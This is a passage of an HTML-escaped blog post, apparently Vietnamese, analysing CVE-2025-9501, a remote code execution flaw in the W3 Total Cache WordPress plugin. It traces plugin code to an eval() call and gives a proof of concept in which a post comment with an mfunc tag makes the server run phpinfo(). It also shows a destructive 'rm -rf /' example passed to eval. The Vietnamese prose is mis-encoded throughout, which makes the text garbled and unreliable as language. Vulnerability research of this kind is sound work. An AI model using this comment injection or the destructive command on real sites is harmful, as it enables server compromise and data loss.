1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo nh∆∞ m√¥ t·∫£, l·ªó h·ªïng xu·∫•t ph√°t t·ª´ h√†m &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic_mfunc( $matches ) {&#xA;    $code1 = trim( $matches[1] );&#xA;    $code2 = trim( $matches[2] );&#xA;    $code  = ( $code1 ? $code1 : $code2 );&#xA;&#xA;    if ( $code ) {&#xA;        $code = trim( $code, &amp;#39;;&amp;#39; ) . &amp;#39;;&amp;#39;;&#xA;&#xA;        try {&#xA;            ob_start();&#xA;            $result = eval( $code );&#xA;            $output = ob_get_contents();&#xA;            ob_end_clean();&#xA;        } catch ( \Exception $ex ) {&#xA;            $result = false;&#xA;        }&#xA;&#xA;        if ( false === $result ) {&#xA;            $output = sprintf( &amp;#39;Unable to execute code: %s&amp;#39;, htmlspecialchars( $code ) );&#xA;        }&#xA;    } else {&#xA;        $output = htmlspecialchars( &amp;#39;Invalid mfunc tag syntax. The correct format is: &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --&amp;gt;&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt; or &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc --&amp;gt;PHP code&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt;.&amp;#39; );&#xA;    }&#xA;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;eval()&lt;/code&gt; xu·∫•t hi·ªán t·∫°i d√≤ng 11. N√≥ l√† m·ªôt h√†m r·∫•t ƒë·∫∑c bi·ªát v√† nguy hi·ªÉm v√¨ n√≥ cho ph√©p th·ª±c thi m·ªôt chu·ªói PHP nh∆∞ l√† code th·ª±c s·ª±. V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = &amp;#39;system(&amp;#34;rm -rf /&amp;#34;)&amp;#39;;&#xA;eval($command);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi plugin ƒë∆∞·ª£c install v√† active, n√≥ s·∫Ω th√™m v√†o ƒë·∫ßu d√≤ng c·ªßa &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/** Enable W3 Total Cache */&#xA;define(&amp;#39;WP_CACHE&amp;#39;, true); // Added by W3 Total Cache&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;D√πng ƒë·ªÉ ƒëƒÉng k√≠ t√≠nh nƒÉng cache cho WordPress. &lt;code&gt;WP_CACHE&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong &lt;code&gt;wp-settings.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( WP_CACHE &amp;amp;&amp;amp; apply_filters( &amp;#39;enable_loading_advanced_cache_dropin&amp;#39;, true ) &amp;amp;&amp;amp; file_exists( WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39; ) ) {&#xA;&#x9;// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.&#xA;&#x9;include WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39;;&#xA;&#xA;&#x9;// Re-initialize any hooks added manually by advanced-cache.php.&#xA;&#x9;if ( $wp_filter ) {&#xA;&#x9;&#x9;$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress s·∫Ω t·ª± ƒë·ªông load file &lt;code&gt;advanced-cache.php&lt;/code&gt; n·∫øu n√≥ t·ªìn t·∫°i. Khi plugin ƒë∆∞·ª£c active th√¨ n√≥ ƒë√£ t·∫°o ra file n√†y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/**&#xA; * File: advanced-cache.php&#xA; *&#xA; * W3 Total Cache advanced cache module.&#xA; *&#xA; * @package W3TC&#xA; */&#xA;&#xA;defined( &amp;#39;ABSPATH&amp;#39; ) || die();&#xA;&#xA;global $w3tc_start_microtime;&#xA;$w3tc_start_microtime = microtime( true );&#xA;&#xA;/**&#xA; * Abort W3TC loading if WordPress is upgrading.&#xA; */&#xA;if ( defined( &amp;#39;WP_INSTALLING&amp;#39; ) &amp;amp;&amp;amp; WP_INSTALLING ) {&#xA;&#x9;return;&#xA;}&#xA;&#xA;if ( ! defined( &amp;#39;W3TC_IN_MINIFY&amp;#39; ) ) {&#xA;&#x9;if ( ! defined( &amp;#39;W3TC_DIR&amp;#39; ) ) {&#xA;&#x9;&#x9;define( &amp;#39;W3TC_DIR&amp;#39;, ( defined( &amp;#39;WP_PLUGIN_DIR&amp;#39; ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . &amp;#39;/plugins&amp;#39; ) . &amp;#39;/w3-total-cache&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39; ) ) {&#xA;&#x9;&#x9;if ( defined( &amp;#39;WP_ADMIN&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;// Only display errors in wp-admin.&#xA;&#x9;&#x9;&#x9;printf( &amp;#39;&amp;lt;strong&amp;gt;W3 Total Cache Error:&amp;lt;/strong&amp;gt; some files appear to be missing or out of place. Please re-install plugin or remove &amp;lt;strong&amp;gt;%s&amp;lt;/strong&amp;gt;. &amp;lt;br /&amp;gt;&amp;#39;, __FILE__ );&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;require_once W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39;;&#xA;&#xA;&#x9;&#x9;if ( class_exists( &amp;#39;\W3TC\Dispatcher&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$w3tc_redirect = \W3TC\Dispatcher::component( &amp;#39;Mobile_Redirect&amp;#39; );&#xA;&#x9;&#x9;&#x9;$w3tc_redirect-&amp;gt;process();&#xA;&#xA;&#x9;&#x9;&#x9;$w3tc_config = \W3TC\Dispatcher::config();&#xA;&#x9;&#x9;&#x9;if ( $w3tc_config-&amp;gt;get_boolean( &amp;#39;pgcache.enabled&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$o = \W3TC\Dispatcher::component( &amp;#39;PgCache_ContentGrabber&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$o-&amp;gt;process();&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi t√≠nh nƒÉng page cache (&lt;code&gt;pgcache&lt;/code&gt;) ƒë∆∞·ª£c b·∫≠t th√¨ &lt;code&gt;$o-&amp;gt;process()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√≠ logic c·ªßa page cache.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; title=&#34;Enable page cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Page Cache&lt;/h2&gt;&lt;p&gt;Enable page cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#39; alt=&#34;Page Cache&#34; height=&#34;593&#34; width=&#34;1227&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable page cache&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong &lt;code&gt;process()&lt;/code&gt;, plugin chu·∫©n b·ªã c∆° ch·∫ø can thi·ªáp v√†o n·ªôi dung trang tr∆∞·ªõc khi tr·∫£ v·ªÅ cho tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process() {&#xA;    $this-&amp;gt;run_extensions_dropin();&#xA;    // Skip caching for some pages.&#xA;    ...&#xA;    Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°i d√≤ng cu·ªëi, h√†m g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Plugin ƒëƒÉng k√Ω m·ªôt callback t√™n &lt;code&gt;pagecache&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Callback th·ª±c t·∫ø l√† ph∆∞∆°ng th·ª©c &lt;code&gt;ob_callback&lt;/code&gt; c·ªßa object hi·ªán t·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;Callback n√†y s·∫Ω ƒë∆∞·ª£c g·ªçi &lt;strong&gt;sau khi WordPress sinh xong HTML&lt;/strong&gt;, ƒë·ªÉ plugin c√≥ c∆° h·ªôi x·ª≠ l√Ω (nh∆∞ t·ªëi ∆∞u, n√©n, ghi cache‚Ä¶) tr∆∞·ªõc khi g·ª≠i cho tr√¨nh duy·ªát.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;add_ob_callback()&lt;/code&gt; ch·ªâ l√†m nhi·ªám v·ª• l∆∞u callback l·∫°i ƒë·ªÉ s·ª≠ d·ª•ng v·ªÅ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ob_callback( $key, $callback ) {&#xA;    $GLOBALS[&amp;#39;_w3tc_ob_callbacks&amp;#39;][ $key ] = $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;ob_callback()&lt;/code&gt; n√†y ƒë∆∞·ª£c g·ªçi khi output buffer x·∫£ n·ªôi dung HTML ra, v√† n√≥ ki·ªÉm tra xem trang c√≥ ‚Äún·ªôi dung ƒë·ªông‚Äù hay kh√¥ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ob_callback( $buffer ) {&#xA;    ...&#xA;    $has_dynamic = $this-&amp;gt;_has_dynamic( $buffer );&#xA;    ...&#xA;    // We can&amp;#39;t capture output in ob_callback so we use shutdown function.&#xA;    if ( $has_dynamic ) {&#xA;        $this-&amp;gt;_shutdown_buffer = $buffer;&#xA;&#xA;        $buffer = &amp;#39;&amp;#39;;&#xA;&#xA;        register_shutdown_function(&#xA;            array(&#xA;                $this,&#xA;                &amp;#39;shutdown&amp;#39;,&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$buffer&lt;/code&gt; l√† to√†n b·ªô HTML m√† WordPress v·ª´a t·∫°o ra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;_has_dynamic()&lt;/code&gt; ki·ªÉm tra xem trong HTML c√≥ ph·∫ßn n√†o &lt;strong&gt;kh√¥ng th·ªÉ cache tr·ª±c ti·∫øp&lt;/strong&gt;, t·ª©c n√≥ kh√¥ng ƒë∆∞·ª£c c·ªë ƒë·ªãnh:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _has_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    return preg_match(&#xA;        &amp;#39;~&amp;lt;!--\s*m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        $buffer&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Theo nh∆∞ &lt;a href=&#34;https://1fix.io/blog/2015/02/22/page-fragment-caching-w3-total-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;t√†i li·ªáu&lt;/a&gt; t√¥i t√¨m ƒë∆∞·ª£c th√¨ &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c c·∫•u h√¨nh trong &lt;code&gt;wp-config.php&lt;/code&gt; n·∫øu mu·ªën s·ª≠ d·ª•ng &lt;code&gt;page fragment caching&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;define(&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;, &amp;#39;W3TC_DYNAMIC_SECURITY_VALUE&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·ªôi dung ƒë·ªông s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&#xA;or&#xA;&amp;lt;!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu &lt;strong&gt;kh√¥ng c√≥ n·ªôi dung ƒë·ªông&lt;/strong&gt;, h√†m tr·∫£ v·ªÅ &lt;code&gt;$buffer&lt;/code&gt; b√¨nh th∆∞·ªùng ƒë·ªÉ c√≥ th·ªÉ ghi cache ngay.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu &lt;strong&gt;c√≥ n·ªôi dung ƒë·ªông&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;To√†n b·ªô HTML ƒë∆∞·ª£c l∆∞u l·∫°i v√†o &lt;code&gt;$this-&amp;gt;_shutdown_buffer&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;H√†m tr·∫£ v·ªÅ chu·ªói r·ªóng (t·∫°m th·ªùi kh√¥ng xu·∫•t g√¨ ra)&lt;/li&gt;&#xA;&lt;li&gt;Plugin ƒëƒÉng k√Ω &lt;code&gt;register_shutdown_function()&lt;/code&gt; ƒë·ªÉ g·ªçi ph∆∞∆°ng th·ª©c &lt;code&gt;shutdown()&lt;/code&gt; sau khi PHP k·∫øt th√∫c ch·∫°y to√†n b·ªô request&#xA;‚áí Vi·ªác x·ª≠ l√Ω HTML b·ªã d·ªùi sang cu·ªëi c√πng, sau khi m·ªçi n·ªôi dung ƒë·ªông ƒë√£ s·∫µn s√†ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function shutdown() {&#xA;    $compression = $this-&amp;gt;_page_key_extension[&amp;#39;compression&amp;#39;];&#xA;&#xA;    // Parse dynamic content.&#xA;    $buffer = $this-&amp;gt;_parse_dynamic( $this-&amp;gt;_shutdown_buffer );&#xA;&#xA;    // Compress page according to headers already set.&#xA;    $compressed_buffer = $this-&amp;gt;_compress( $buffer, $compression );&#xA;&#xA;    echo $compressed_buffer; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;shutdown&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;_parse_dynamic()&lt;/code&gt; ƒë·ªÉ X·ª≠ l√Ω c√°c kh·ªëi ƒë·ªông trong HTML - t√¨m trong to√†n b·ªô HTML c√°c kh·ªëi ƒë√°nh d·∫•u n·ªôi dung ƒë·ªông c·ªßa W3TC v√† thay th·∫ø ch√∫ng b·∫±ng k·∫øt qu·∫£ th·ª±c t·∫ø:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) {&#xA;        return $buffer;&#xA;    }&#xA;&#xA;    $buffer = preg_replace_callback(&#xA;        &amp;#39;~&amp;lt;!--\s*mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array(&#xA;            $this,&#xA;            &amp;#39;_parse_dynamic_mfunc&amp;#39;,&#xA;        ),&#xA;        $buffer&#xA;    );&#xA;&#xA;    $buffer = preg_replace_callback(&#xA;        &amp;#39;~&amp;lt;!--\s*mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array(&#xA;            $this,&#xA;            &amp;#39;_parse_dynamic_mclude&amp;#39;,&#xA;        ),&#xA;        $buffer&#xA;    );&#xA;&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu h·∫±ng &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; ch∆∞a t·ªìn t·∫°i ‚Üí tr·∫£ v·ªÅ nguy√™n HTML, coi nh∆∞ kh√¥ng c√≥ n·ªôi dung ƒë·ªông.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu c√≥, h√†m l·∫ßn l∆∞·ª£t ch·∫°y hai &lt;code&gt;preg_replace_callback()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;T√¨m c√°c c·∫∑p ghi ch√∫ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfunc{security} --&amp;gt; ... &amp;lt;!-- /mfunc{security} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;v√† g·ªçi &lt;code&gt;_parse_dynamic_mfunc()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω n·ªôi dung b√™n trong.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;T√¨m c√°c c·∫∑p ghi ch√∫:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mclude{security} --&amp;gt; ... &amp;lt;!-- /mclude{security} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;v√† g·ªçi &lt;code&gt;_parse_dynamic_mclude()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω t∆∞∆°ng t·ª±.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;M·ªói callback s·∫Ω nh·∫≠n ƒëo·∫°n HTML kh·ªõp v·ªõi regex v√† tr·∫£ v·ªÅ k·∫øt qu·∫£ ƒë·ªông ƒë√£ ƒë∆∞·ª£c ch·∫°y.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£ cu·ªëi c√πng l√† &lt;code&gt;$buffer&lt;/code&gt; v·ªõi c√°c kh·ªëi mfunc/mclude ƒë√£ ƒë∆∞·ª£c thay th·∫ø b·∫±ng n·ªôi dung th·ª±c, s·∫µn s√†ng ƒë·ªÉ n√©n v√† xu·∫•t ra cho ng∆∞·ªùi d√πng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User requests any front‚Äëend page (unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads wp-settings.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WP_CACHE = true ‚Üí Load advanced-cache.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;advanced-cache.php runs Dispatcher&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;PgCache_ContentGrabber-&amp;gt;process()&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Util_Bus::add_ob_callback(&amp;#39;pagecache&amp;#39;, &amp;#39;ob_callback&amp;#39;)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;WordPress renders full HTML into output buffer&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;ob_callback($buffer) triggered&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;_has_dynamic($buffer) ?&amp;#34;}&#xA;I --&amp;gt;|No| J[&amp;#34;Return buffer as-is ‚Üí Serve cached page&amp;#34;]&#xA;I --&amp;gt;|Yes| K[&amp;#34;Save buffer to _shutdown_buffer&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;register_shutdown_function(shutdown)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;After request completes ‚Üí shutdown()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;_parse_dynamic(_shutdown_buffer)&amp;#34;]&#xA;&#xA;N --&amp;gt; O{&amp;#34;HTML contains &amp;lt;!-- mfunc ... --&amp;gt; ?&amp;#34;}&#xA;O --&amp;gt;|Yes| P[&amp;#34;_parse_dynamic_mfunc()&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Extract payload from comment and run eval()&amp;#34;]&#xA;&#xA;O --&amp;gt;|Or mclude| R[&amp;#34;_parse_dynamic_mclude() (include type)&amp;#34;]&#xA;&#xA;Q --&amp;gt; S[&amp;#34;Output replaced with execution result&amp;#34;]&#xA;R --&amp;gt; S&#xA;&#xA;S --&amp;gt; T[&amp;#34;Page optionally compressed&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;echo back to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Install v√† active plugin, h√†m th√†nh b∆∞·ªõc setup c∆° b·∫£n&lt;/li&gt;&#xA;&lt;li&gt;B·∫≠t t√πy ch·ªçn Page Cache&lt;/li&gt;&#xA;&lt;li&gt;C·∫•u &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Comment m·ªôt post b·∫•t k√¨ v·ªõi content :&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfuncvalue --&amp;gt;phpinfo();&amp;lt;!-- /mfuncvalue --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#39; alt=&#34;Result&#34; height=&#34;1078&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; 